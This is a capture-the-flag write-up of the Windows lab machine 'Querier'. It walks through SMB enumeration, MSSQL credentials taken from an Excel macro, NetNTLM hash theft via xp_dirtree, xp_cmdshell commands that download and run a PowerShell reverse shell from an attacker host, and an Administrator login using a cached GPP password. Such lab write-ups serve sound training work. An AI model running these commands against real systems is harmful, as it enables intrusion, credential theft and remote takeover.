+++
date = '2026-07-22T17:24:19+02:00'
draft = false
title = 'Querier Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`22/07/2026`**

![Querier.png](/images/imgs_querier/Querier.png)

---
# Introduction

**_Querier_** is a **Medium-level Windows** box that highlights common misconfigurations within a domain-joined environment. The exploitation path begins with anonymous **SMB** enumeration, leading to a **macro-enabled Excel** file containing hardcoded **MSSQL** credentials. These credentials are used to force an **NTLM** authentication via **`xp_dirtree`**, allowing us to steal and crack a **NetNTLM hash**. With the cracked password, we gain sysadmin access to the database, execute commands via **`xp_cmdshell`**, and obtain a reverse shell. Privilege escalation relies on post-exploitation enumeration to uncover a cached **Group Policy Preferences** (**GPP**) file containing the **Administrator**'s password, granting full system compromise via **WinRM**.

---
# Techniques Used

- **Macro Inspection & Credential Extraction**

- **NetNTLM Theft**

- **Password Hash Cracking**

- **MSSQL xp_cmdshell Abuse**

- **Cached GPP Files Abuse**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- querier -Pn
```

```text
PORT      STATE    SERVICE      REASON
135/tcp   open     msrpc        syn-ack ttl 127
139/tcp   open     netbios-ssn  syn-ack ttl 127
445/tcp   open     microsoft-ds syn-ack ttl 127
1433/tcp  open     ms-sql-s     syn-ack ttl 127
5985/tcp  open     wsman        syn-ack ttl 127
47001/tcp open     winrm        syn-ack ttl 127
```

Targeted scan with default scripts and service detection:

```bash
nmap -sC -sV querier -Pn
```

```text
PORT     STATE SERVICE       REASON          VERSION
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.71.63:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
```

**Note**: _The Nmap script **`ms-sql-ntlm-info`** on port **1433** successfully leaked the internal **Active Directory** domain name (**`HTB.LOCAL`**). This confirms that **Querier** is a **domain-joined machine**, acting as a **Member Server** rather than a **Domain Controller**._

## SMB Enumeration

Since **SMB** was open, I started enumerating the shares using **NetExec**. I tested for both null sessions and Guest access with no results:

```bash
nxc smb querier -u '' -p '' --shares
nxc smb querier -u 'Guest' -p '' --shares
```

I also tried using **smbmap**:

```bash
smbmap -H querier
```

Not sure why, but still no results.

![smbfail.png](/images/imgs_querier/smbfail.png)


However, when I tried listing the shares using **smbclient**, it successfully revealed a **`Reports`** share. I connected to it and downloaded all its contents.

```bash
smbclient -L \\\\querier
smbclient \\\\querier\\Reports
smb: \> mget *
```

![file.png](/images/imgs_querier/file.png)

---
# Initial Access | MSSQL to Reverse Shell

I opened the downloaded file with **LibreOffice Calc** and inspected the document's **macros**.

![macro.png](/images/imgs_querier/macro.png)

Digging through the code, I found a set of credentials and the connection string for the **MSSQL** server:

![sqlpass.png](/images/imgs_querier/sqlpass.png)

I logged into the database using **impacket-mssqlclient**:

```bash
impacket-mssqlclient reporting@querier -windows-auth
```

I poked around but realized I couldn't do much since the reporting user lacked **SA** privileges, meaning I couldn't even enable **`xp_cmdshell`**.

![insuff.png](/images/imgs_querier/insuff.png)

**Note**: _At this point, I remembered a technique to steal **NetNTLM** hashes from an **MSSQL server** by forcing it to authenticate to an **SMB** share we control. You can find it documented here on [**HackTricks**](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)._

I set up **Responder** on my attacker machine:

```bash
sudo responder -I tun0
```

And on the **MSSQL** prompt, I triggered the authentication using the **`xp_dirtree`** stored procedure:

```SQL
exec xp_dirtree '\\attacker_ip\share\file'
```

![hash.png](/images/imgs_querier/hash.png)

**Responder** caught the **NetNTLM hash** for the user **`mssql-svc`**. I saved the hash to a file and cracked it with **john**:

```bash
john mssql_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![pass.png](/images/imgs_querier/pass.png)

Using this new credentials, I logged back into the **MSSQL server**:

```bash
impacket-mssqlclient mssql-svc@querier -windows-auth
```

Now with the proper permissions, I enabled **`xp_cmdshell`**. 

![xp_cmd.png](/images/imgs_querier/xp_cmd.png)

Before grabbing a shell, I read the **user flag** directly from the database using the **`OPENROWSET`** function:

```SQL
xp_cmdshell dir C:\Users\mssql-svc\Desktop
SELECT * FROM OPENROWSET(BULK N'C:\Users\mssql-svc\Desktop\user.txt', SINGLE_CLOB) AS Contents
```

![userflag.png](/images/imgs_querier/userflag.png)

To get a proper interactive shell, I grabbed a copy of **`Invoke-PowerShellTcp.ps1`**, appended my connection details to the bottom of the script, and hosted it using **Python**:

```bash
echo "Invoke-PowerShellTcp -Reverse -IPAddress <attacker_ip> -Port <attacker_port>" >> Invoke-PowerShellTcp.ps1
python3 -m http.server
```

Back on the **MSSQL** prompt, I used **`xp_cmdshell`** to download and execute the reverse shell script:

```SQL
xp_cmdshell powershell iwr -uri http://10.10.16.77:8000/Invoke-PowerShellTcp.ps1 -Outfile C:\Users\mssql-svc\Desktop\fall.ps1
xp_cmdshell powershell.exe -command "C:\Users\mssql-svc\Desktop\fall.ps1"
```

![transfer.png](/images/imgs_querier/transfer.png)

![initial_access.png](/images/imgs_querier/initial_access.png)

I caught the callback on my listener and successfully got a reverse shell as **`mssql-svc`**.

---
# Privilege Escalation | GPP Abuse

With a foothold on the system, I checked privileges using **`whoami /priv`** and immediately noticed that **`SeImpersonatePrivilege`** was enabled.

![rabbit.png](/images/imgs_querier/rabbit.png)

I initially tried to abuse this with a **GodPotato attack**. While I received a connection back on my listener, it failed to spawn a usable shell. I also transferred **`WinPEAS.exe`** to the target machine, but I wasn't able to run it.

Since the automated executables weren't working, I switched to **PowerShell-based** enumeration using **`PowerUp.ps1`**:

```PowerShell
Import-Module .\RowRowFightThePowa.ps1
Invoke-AllChecks
```

![creds.png](/images/imgs_querier/creds.png)

The script successfully found a **Cached GPP** (**Group Policy Preferences**) file containing the **Administrator** password in cleartext.

![kamina.jpeg](/images/imgs_querier/kamina.jpeg)

I simply connected to the machine using **Evil-WinRM** and claimed the root flag.

```bash
evil-winrm -i querier -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
```

![rootflag.png](/images/imgs_querier/rootflag.png)

---
# Final Thoughts

Although **_Querier_** is officially rated as a **Medium** machine, it honestly felt much more like an **Easy** one. If you are already familiar with standard **MSSQL** exploitation, the path to full compromise is quite straightforward.

The only step that might justify the **Medium** rating is the initial access phase. Forcing the **NetNTLM** theft via **`xp_dirtree`** is a slightly more unusual vector compared to having direct **`xp_cmdshell`** execution right out of the box. However, once you secure that sysadmin hash and crack it, the rest of the machine falls very quickly.

**Sources**:

- **MSSQL HackTricks | https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html**

- **PowerUp.ps1 | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1**